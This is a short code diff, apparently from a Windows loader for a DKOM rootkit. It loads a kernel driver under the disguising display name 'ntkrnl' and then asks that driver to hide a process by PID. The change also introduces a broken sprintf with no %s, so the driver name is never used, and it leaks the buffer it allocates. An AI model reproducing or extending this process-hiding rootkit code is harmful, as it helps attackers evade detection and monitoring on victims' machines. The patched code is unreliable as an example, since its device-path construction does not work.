@@ -16,7 +16,7 @@ int main(int argc, char *argv[])
 	//if (argc < 2)
 	//	printf("Not enougth arguments");
 	//else
-	char* driverName = "WDM-DKOM";
+	char* driverName = "DKOM";
 	char* displayName = "ntkrnl"; // friendly name
 	if (util_load_sysfile(driverName, displayName))//"friendly driver"))//argv[1]);
 		hideProcess(driverName, 4); //(int)argv[1]);
@@ -95,7 +95,9 @@ bool util_load_sysfile(char* driverName, char* displayName)
 
 bool hideProcess(char * driverName, int pid)
 {
-	HANDLE hFile = CreateFile("\\\\.\\DKOM", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); // open driver
+	char* driverToOpen = new char[1024];
+	sprintf(driverToOpen, "\\\\.\\", driverName); // "\\\\.\\DKOM" for example
+	HANDLE hFile = CreateFile(driverToOpen, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); // open driver
 
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
